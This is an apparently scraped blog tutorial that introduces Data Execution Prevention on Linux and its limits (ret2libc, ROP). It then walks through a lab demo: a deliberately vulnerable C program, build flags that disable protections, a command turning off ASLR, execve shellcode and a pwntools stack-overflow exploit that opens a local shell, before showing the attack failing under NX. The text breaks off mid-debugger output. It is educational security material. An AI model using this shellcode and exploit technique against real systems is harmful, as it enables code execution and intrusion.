title = "Exploit Mitigation Techniques - Part 1 -  Data Execution Prevention (DEP)"
description = """
Preface

Welcome to a new series about GNU/Linux exploit mitigation techniques.
I want to shift the focus to the bypassed techniques to create a series about currently deployed approaches. Afterwards, I'd like to focus on their limitations with a follow up on how to bypass them with a sample"""
full_description = '''Exploitation Exploit Mitigation Techniques - Part 1 - Data Execution Prevention (DEP) Published 4 May 2020 12 min read By 0x434b PrefaceWelcome to a new series about GNU/Linux exploit mitigation techniques.I want to shift the focus to the bypassed techniques to create a series about currently deployed approaches. Afterwards, I'd like to focus on their limitations with a follow up on how to bypass them with a sample demo.REMARK: This is the result of my recent self study and might contain faulty information.If you find any. Let me know! ThanksThis first article has a small introduction to the whole topic. Later articles will have a bigger focus on possible design choices and bypasses, especially when combining the introduced exploit mitigations.RequirementsSome spare minutesa basic understanding of what causes memory corruptionsthe will to ask or look up unknown terms yourselfsome ASM/C knowledge for the PoC partIntroductionEver since the first exploits appeared, the amount of publicly known ones has risen tremendously over the last two decades. Even today the total amount of public known exploits is on the rise with the increased security layers in all areas of software development. Nowadays a system breach or hostile takeover has way more impact compared to a decade ago. This leads to an increased popularity in exploiting web applications and reaching any form of code execution in recent days. Nevertheless, systems itself are shown to be exploitable as ever.The last few years already have more than enough memorable system breaches with one of the most prominent example as of recently: the Equifax debacle with a massive leaked dataset from over 140 million customers, showing personal data, addresses and more importantly their social security numbers (relevant CVE).Similar scenarios happened to Sony as well, causing leakage of unreleased movie material and data from PlayStation network users, revealing people's names, addresses, email addresses, birth dates, user names, passwords, logins, security questions and even credit card information.Another recent incident happened under the name BlueBorne, leaving over 8 billion Bluetooth capable devices at risk. The flaw itself lies in the Bluetooth protocol and can lead from information leaks to remote code execution and is triggered over the air.All the caused havoc in systems needs to get diminished by hardening applications and system internals even further to prevent future attacks more successfully. All major operating systems and big software vendors already adapted such features. The "incompleteness" and made trade-off deals when implementing such mechanics is the reason for reappearing breaches.Data execution prevention (DEP)Basic DesignThe huge popularity of type unsafe languages, which gives programmers total freedom on memory management, still causes findings of memory corruption bugs today. Patching those are mostly not a big deal and happens frequently. They remain a real threat though, since many systems, especially in large scale companies run on unpatched legacy code. These kinds of flaws still exist and may cause harm when abused. This clearly shows in the still roughly 50 % market share of Windows 7 in 2017, whose mainstream support already ended in 2015.Windows 8 and Windows 10 combined barely reach over 40% market share in 2017. Moreover, new findings are reported monthly and can be looked up at the CVE DB.Preventing those memory corruptions to be used is the goal of data execution prevention (DEP). The mostly hardware based method mitigates any form of code execution from data pages in memory and hence prevents buffer based attacks, which inject malicious code in memory structures. It does so by tagging pages in memory as not executable if its contents are data and keeps them executable if it is code. When a processor attempts to run code from a not executable marked page an access violation is thrown followed by a control transfer to the operating system for exception handling, resulting in a terminated application. Besides a hardware enforced version of DEP it can also be complemented through software security checks to make better use of implemented exception handling routines.Overall this technique prevents usage of newly injected code into an applications' memory. Even with a proceeded injection of malicious code it cannot be executed anymore as shown later.DEP was first implemented on Linux based systems by the PAX project since kernel version 2.6.7 in 2004. It makes use of a No eXecute (NX) bit in AMD, and the Execute Disable Bit (XD) in Intel processors on both 32 bit and 64 bit architecture. The counterpart for Windows machines was available since Windows XP Service Pack 2 in 2004 as well.LimitationsThis directly leads to the weaknesses of data execution prevention. It successfully mitigates basic buffer overflow attacks, but more advanced techniques like return to libc (ret2libc), return oriented programming (ROP), or any other return to known code attacks are not accounted for. These kinds of attacks, often labeled under the term arc injection make up a big percentage of recent bypasses. They were developments to bypass DEP in particular, which make use of already present code within an application, whose memory pages are marked executable.Return to libc uses functions and code from the system library glibc, which is linked against almost any binary. It offers a wide area of available functions.Return oriented programming on the other hand focuses on finding present code snippets from machine code instructions, which chained together create a gadget.A gadget consists of a few machine code instructions and always ends with a return statement to let the execution return to the abused application before executing the next gadget. One gadget handles exactly one functionality. Chaining them together to a gadget chain creates an exploit.Note: It has been shown that not always a real return statement is needed. Instead a function sequence serving as a 'trampoline' to transfer control flow is used.PoCTo make up for the wall of text above we will continue with some elementary show cases, which hopefully will demonstrate the importance of DEP/NX.Abusing a DEP/NX disabled binaryFirst let's start abusing a binary, which isn't hardened at all.Let's build a simple vulnerable binary in C ourselves.#include <stdio.h> #include <string.h> #include <stdlib.h> char totally_secure(char *arg2[]) { char buffer[256]; printf("What is your name?\n"); strcpy(buffer, arg2[1]); printf("Hello: %s!\n", buffer); } int main(int argc, char *argv[]) { setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); printf("Hello, I'm your friendly & totally secure binary :)!\n"); totally_secure(argv); return 0; } This code is vulnerable to a buffer overflow in the function totally_secure()Compilation and first look at the binary$ gcc vuln.c -o vuln_no_prots -fno-stack-protector -no-pie -Wl,-z,norelro -m32 -z execstack $ echo 0 > /proc/sys/kernel/randomize_va_space First look from inside GDBpwndbg> checksec [*] '/home/pwnbox/DEP/binary/vuln_no_prots' Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments pwndbg> As we can see we've got fully disabled exploit mitigation techniques. Also, no ASLR whatsoever. This is only for the sake of shining some light on this particular technique. Combinations of exploit mitigation techniques will be covered at a later time.ExploitA basic overflow is induced by filling the buffer with the following contents:pwndbg> c Continuing. Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB! Program received signal SIGSEGV, Segmentation fault. 0x42424242 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA [─────────────────────────────────────────────────────────────────REGISTERS──────────────────────────────────────────────────────────────────] *EAX 0x119 EBX 0x8049838 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804974c (_DYNAMIC) ◂— 1 *ECX 0xffffccd0 ◂— 0x41414141 ('AAAA') *EDX 0xf7fae870 (_IO_stdfile_1_lock) ◂— 0 EDI 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x5d /* 0x1b5db0 */ ESI 0xffffce20 ◂— 0x2 *EBP 0x41414141 ('AAAA') *ESP 0xffffcde0 —▸ 0xffffce00 ◂— 0x0 *EIP 0x42424242 ('BBBB') [───────────────────────────────────────────────────────────────────DISASM───────────────────────────────────────────────────────────────────] Invalid address 0x42424242 It shows that we have successfully overwritten the EIP and EBPThe executed ret instruction took the next value off the stackand loaded that into the EIP register (our 'BBBB') and then code execution tries to continue from there. So we can fill the buffer with something like /bin/sh + padding or try overflowing that position with shellcode. We can craft one ourselves or take an already nicely prepared shell code from hereIn the end I used this one, since it honestly doesn't make much of a difference at the moment:46bytes: \x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68 The quick'n'dirty pwntools script:#!/usr/bin/env python import argparse import sys from pwn import * from pwnlib import * context.arch = 'i386' context.os = 'linux' context.endian = 'little' context.word_size = '32' context.log_level = 'DEBUG' binary = ELF('./binary/vuln_no_prots') def main(): parser = argparse.ArgumentParser(description="pwnerator") parser.add_argument('--dbg', '-d', action='store_true') args = parser.parse_args() executable = './binary/vuln_no_prots' payload = '\x90'*222 # shellcode 46 bytes # 268 bytes - 46 bytes = length of nop sled payload += '\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b' payload += '\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68' payload += '\x20\xcd\xff\xff' # stack if args.dbg: r = gdb.debug([executable, payload], gdbscript=""" b *main continue""", ) else: r = process([executable, payload]) r.interactive() if __name__ == '__main__': main() sys.exit(0)Executing the whole payload :pwnbox@lab:~/DEP$ python bypass_no_prot.py INFO [*] '/home/pwnbox/DEP/binary/vuln_no_prots' Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments [+] Starting local process './binary/vuln_no_prots': pid 65330 [*] Switching to interactive mode Hello, I'm your friendly & totally secure binary :)! What is your name? Hello: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901��F1�1��\x80�[1��C\x07\x89\x89C\x0c\xb0\x0b\x8d\x8dS\x0c̀���\xff\xff/bin/sh ��\xff! $ whoami pwnbox $ We successfully continued execution from our stack. We skipped the NOP-sled and our shell got popped. We easily achieved code execution. So far so good.Bypassing DEP/NXOkay so far this was just like any other simple buffer overflow tutorial out there. Now things get a little more interesting. We need to craft a new exploit, for the same binary, but this time with DEP/NX enabled. The exploit from before will not work anymore as shown below.Our new binary has the following configuration:> gcc vuln.c -o vuln_with_nx -fno-stack-protector -no-pie -Wl,-z,norelro -m32 > gdb ./vuln_with_nx pwndbg> checksec [*] '/home/pwnbox/DEP/binary/vuln_with_nx' Arch: i386-32-little RELRO: No RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) pwndbg> Executing our payload from before leaves us with this: python bypass_no_prot.py INFO [+] Starting local process './binary/vuln_with_nx': pid 65946 [*] Switching to interactive mode Hello, I'm your friendly & totally secure binary :)! What is your name? Hello: \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x901��F1�1��\x80�[1��C\x07\x89\x89C\x0c\xb0\x0b\x8d\x8dS\x0c̀���\xff\xff/bin/sh ��\xff! [*] Got EOF while reading in interactive $ whoami [*] Process './binary/vuln_with_nx' stopped with exit code -11 (SIGSEGV) (pid 65946) [*] Got EOF while sending in interactive GDB reveals that something went wrong:pwndbg> 0xffffcd20 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA [─────────────────────────────────────────────────────────────────REGISTERS──────────────────────────────────────────────────────────────────] EAX 0x119 EBX 0x69622fff ECX 0xffffa7d0 ◂— 0x6c6c6548 ('Hell') EDX 0xf7fae870 (_IO_stdfile_1_lock) ◂— 0x0 EDI 0xf7fad000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b5db0 ESI 0xffffce50 ◂— 0x2 EBP 0x68732f6e ('n/sh') *ESP 0xffffce10 —▸ 0xffffce00 ◂— 0xffffe5e8 *EIP 0xffffcd20 ◂— 0x90909090 [───────────────────────────────────────────────────────────────────DISASM───────────────────────────────────────────────────────────────────] 0x804851e <totally_secure+88> add esp, 0x10 0x8048521 <totally_secure+91> nop 0x8048522 <totally_secure+92> mov ebx, dword ptr [ebp - 4] 0x8048525 <totally_secure+95> leave 0x8048526 <totally_secure+96> ret ↓ ► 0xffffcd20 nop 0xffffcd21 nop 0xffffcd22 nop 0xffffcd23 nop 0xffffcd24 nop 0xffffcd25 nop [───────────────────────────────────────────────────────────────────STACK───────'''
